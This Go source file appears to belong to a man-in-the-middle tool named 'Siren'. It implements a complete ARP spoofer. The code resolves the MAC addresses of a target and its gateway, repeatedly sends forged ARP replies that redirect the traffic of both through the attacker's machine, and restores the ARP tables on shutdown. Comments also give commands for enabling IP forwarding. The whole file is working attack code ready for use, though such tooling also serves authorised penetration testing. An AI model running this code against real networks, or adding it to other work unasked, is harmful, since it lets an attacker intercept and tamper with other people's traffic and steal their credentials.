package spoof

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"net/netip"

	"github.com/mdlayher/arp"
	"github.com/mdlayher/ethernet"
)

// ARPSpoofer performs ARP spoofing to position Siren as MITM
type ARPSpoofer struct {
	config  *ARPConfig
	client  *arp.Client
	iface   *net.Interface
	running bool
	mu      sync.RWMutex
	stopCh  chan struct{}
	wg      sync.WaitGroup
}

// ARPConfig configures ARP spoofing
type ARPConfig struct {
	Interface      string        // Network interface name (e.g., "eth0")
	TargetIP       net.IP        // Target IP to intercept
	TargetMAC      net.HardwareAddr // Target MAC (if known, otherwise discovered)
	GatewayIP      net.IP        // Gateway IP
	GatewayMAC     net.HardwareAddr // Gateway MAC (if known, otherwise discovered)
	AttackerMAC    net.HardwareAddr // Our MAC address
	UpdateInterval time.Duration // How often to send spoofed ARP packets
	Bidirectional  bool          // Spoof both directions (target and gateway)
	EnableLogging  bool
}

// NewARPSpoofer creates a new ARP spoofer
func NewARPSpoofer(config *ARPConfig) (*ARPSpoofer, error) {
	if config == nil {
		return nil, fmt.Errorf("config cannot be nil")
	}

	if config.Interface == "" {
		return nil, fmt.Errorf("interface name required")
	}

	if config.TargetIP == nil {
		return nil, fmt.Errorf("target IP required")
	}

	if config.GatewayIP == nil {
		return nil, fmt.Errorf("gateway IP required")
	}

	// Get network interface
	iface, err := net.InterfaceByName(config.Interface)
	if err != nil {
		return nil, fmt.Errorf("failed to get interface %s: %w", config.Interface, err)
	}

	// Use interface MAC as attacker MAC if not provided
	if config.AttackerMAC == nil {
		config.AttackerMAC = iface.HardwareAddr
	}

	// Set default update interval
	if config.UpdateInterval == 0 {
		config.UpdateInterval = 2 * time.Second
	}

	// Create ARP client
	client, err := arp.Dial(iface)
	if err != nil {
		return nil, fmt.Errorf("failed to create ARP client: %w", err)
	}

	return &ARPSpoofer{
		config: config,
		client: client,
		iface:  iface,
		stopCh: make(chan struct{}),
	}, nil
}

// Start begins ARP spoofing
func (as *ARPSpoofer) Start(ctx context.Context) error {
	as.mu.Lock()
	if as.running {
		as.mu.Unlock()
		return fmt.Errorf("ARP spoofer already running")
	}
	as.running = true
	as.mu.Unlock()

	// Discover target MAC if not provided
	if as.config.TargetMAC == nil {
		if as.config.EnableLogging {
			log.Printf("[ARP Spoof] Discovering MAC for target %s", as.config.TargetIP)
		}
		mac, err := as.resolveMAC(as.config.TargetIP)
		if err != nil {
			return fmt.Errorf("failed to resolve target MAC: %w", err)
		}
		as.config.TargetMAC = mac
		if as.config.EnableLogging {
			log.Printf("[ARP Spoof] Target MAC: %s", mac)
		}
	}

	// Discover gateway MAC if not provided
	if as.config.GatewayMAC == nil {
		if as.config.EnableLogging {
			log.Printf("[ARP Spoof] Discovering MAC for gateway %s", as.config.GatewayIP)
		}
		mac, err := as.resolveMAC(as.config.GatewayIP)
		if err != nil {
			return fmt.Errorf("failed to resolve gateway MAC: %w", err)
		}
		as.config.GatewayMAC = mac
		if as.config.EnableLogging {
			log.Printf("[ARP Spoof] Gateway MAC: %s", mac)
		}
	}

	if as.config.EnableLogging {
		log.Printf("[ARP Spoof] Starting ARP spoofing")
		log.Printf("[ARP Spoof]   Interface: %s", as.config.Interface)
		log.Printf("[ARP Spoof]   Target: %s (%s)", as.config.TargetIP, as.config.TargetMAC)
		log.Printf("[ARP Spoof]   Gateway: %s (%s)", as.config.GatewayIP, as.config.GatewayMAC)
		log.Printf("[ARP Spoof]   Attacker MAC: %s", as.config.AttackerMAC)
		log.Printf("[ARP Spoof]   Bidirectional: %v", as.config.Bidirectional)
		log.Printf("[ARP Spoof]   Update interval: %v", as.config.UpdateInterval)
	}

	// Start spoofing goroutine
	as.wg.Add(1)
	go as.spoofLoop(ctx)

	return nil
}

// Stop stops ARP spoofing and restores the network
func (as *ARPSpoofer) Stop() error {
	as.mu.Lock()
	if !as.running {
		as.mu.Unlock()
		return nil
	}
	as.running = false
	as.mu.Unlock()

	if as.config.EnableLogging {
		log.Printf("[ARP Spoof] Stopping and restoring network...")
	}

	// Stop spoofing loop
	close(as.stopCh)
	as.wg.Wait()

	// Restore original ARP tables
	if err := as.restoreARP(); err != nil {
		log.Printf("[ARP Spoof] Warning: failed to restore ARP: %v", err)
	}

	// Close ARP client
	if err := as.client.Close(); err != nil {
		return fmt.Errorf("failed to close ARP client: %w", err)
	}

	if as.config.EnableLogging {
		log.Printf("[ARP Spoof] Stopped")
	}

	return nil
}

// spoofLoop continuously sends spoofed ARP packets
func (as *ARPSpoofer) spoofLoop(ctx context.Context) {
	defer as.wg.Done()

	ticker := time.NewTicker(as.config.UpdateInterval)
	defer ticker.Stop()

	// Send initial spoofed packets
	as.sendSpoofedPackets()

	for {
		select {
		case <-ticker.C:
			as.sendSpoofedPackets()
		case <-as.stopCh:
			return
		case <-ctx.Done():
			return
		}
	}
}

// sendSpoofedPackets sends spoofed ARP packets
func (as *ARPSpoofer) sendSpoofedPackets() {
	// Spoof target: tell target that we are the gateway
	if err := as.sendARPReply(as.config.TargetIP, as.config.TargetMAC, as.config.GatewayIP, as.config.AttackerMAC); err != nil {
		if as.config.EnableLogging {
			log.Printf("[ARP Spoof] Error spoofing target: %v", err)
		}
	}

	// Spoof gateway: tell gateway that we are the target (bidirectional)
	if as.config.Bidirectional {
		if err := as.sendARPReply(as.config.GatewayIP, as.config.GatewayMAC, as.config.TargetIP, as.config.AttackerMAC); err != nil {
			if as.config.EnableLogging {
				log.Printf("[ARP Spoof] Error spoofing gateway: %v", err)
			}
		}
	}
}

// sendARPReply sends an ARP reply packet
// Tells victimIP that senderIP has senderMAC
func (as *ARPSpoofer) sendARPReply(victimIP net.IP, victimMAC net.HardwareAddr, senderIP net.IP, senderMAC net.HardwareAddr) error {
	// Convert IPs to netip.Addr
	senderAddr, ok := netip.AddrFromSlice(senderIP)
	if !ok {
		return fmt.Errorf("invalid sender IP")
	}

	victimAddr, ok := netip.AddrFromSlice(victimIP)
	if !ok {
		return fmt.Errorf("invalid victim IP")
	}

	// Create ARP packet
	pkt := &arp.Packet{
		Operation:          arp.OperationReply,
		SenderHardwareAddr: senderMAC,
		SenderIP:           senderAddr,
		TargetHardwareAddr: victimMAC,
		TargetIP:           victimAddr,
	}

	// Send the packet
	if err := as.client.WriteTo(pkt, victimMAC); err != nil {
		return fmt.Errorf("failed to send ARP reply: %w", err)
	}

	return nil
}

// restoreARP restores the correct ARP entries
func (as *ARPSpoofer) restoreARP() error {
	// Restore target's ARP table: tell target the real gateway MAC
	if err := as.sendARPReply(as.config.TargetIP, as.config.TargetMAC, as.config.GatewayIP, as.config.GatewayMAC); err != nil {
		return fmt.Errorf("failed to restore target ARP: %w", err)
	}

	// Restore gateway's ARP table: tell gateway the real target MAC
	if as.config.Bidirectional {
		if err := as.sendARPReply(as.config.GatewayIP, as.config.GatewayMAC, as.config.TargetIP, as.config.TargetMAC); err != nil {
			return fmt.Errorf("failed to restore gateway ARP: %w", err)
		}
	}

	// Send multiple times to ensure it's received
	time.Sleep(100 * time.Millisecond)
	as.sendARPReply(as.config.TargetIP, as.config.TargetMAC, as.config.GatewayIP, as.config.GatewayMAC)
	if as.config.Bidirectional {
		as.sendARPReply(as.config.GatewayIP, as.config.GatewayMAC, as.config.TargetIP, as.config.TargetMAC)
	}

	return nil
}

// resolveMAC resolves an IP address to a MAC address using ARP
func (as *ARPSpoofer) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
	// Convert IP to netip.Addr
	addr, ok := netip.AddrFromSlice(ip)
	if !ok {
		return nil, fmt.Errorf("invalid IP address")
	}

	// Send ARP request
	mac, err := as.client.Resolve(addr)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve %s: %w", ip, err)
	}

	return mac, nil
}

// IsRunning returns whether the spoofer is running
func (as *ARPSpoofer) IsRunning() bool {
	as.mu.RLock()
	defer as.mu.RUnlock()
	return as.running
}

// GetConfig returns the current configuration
func (as *ARPSpoofer) GetConfig() *ARPConfig {
	return as.config
}

// ARPSpoofStats contains statistics about ARP spoofing
type ARPSpoofStats struct {
	PacketsSent   uint64
	PacketsFailed uint64
	Uptime        time.Duration
	StartTime     time.Time
}

// Stats returns ARP spoofing statistics (placeholder for future implementation)
func (as *ARPSpoofer) Stats() *ARPSpoofStats {
	return &ARPSpoofStats{
		// Statistics tracking not implemented yet
		StartTime: time.Now(),
	}
}

// EnableIPForwarding enables IP forwarding on the system
// This is required for MITM to work properly
func EnableIPForwarding() error {
	// This is platform-specific
	// Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
	// macOS: sysctl -w net.inet.ip.forwarding=1
	// Windows: netsh interface ipv4 set interface "Interface Name" forwarding=enabled

	// Simplified implementation - would need platform detection
	return fmt.Errorf("IP forwarding must be enabled manually: sysctl -w net.ipv4.ip_forward=1")
}

// ParseMAC parses a MAC address string
func ParseMAC(s string) (net.HardwareAddr, error) {
	return net.ParseMAC(s)
}

// BroadcastMAC returns the Ethernet broadcast MAC address
func BroadcastMAC() net.HardwareAddr {
	return ethernet.Broadcast
}
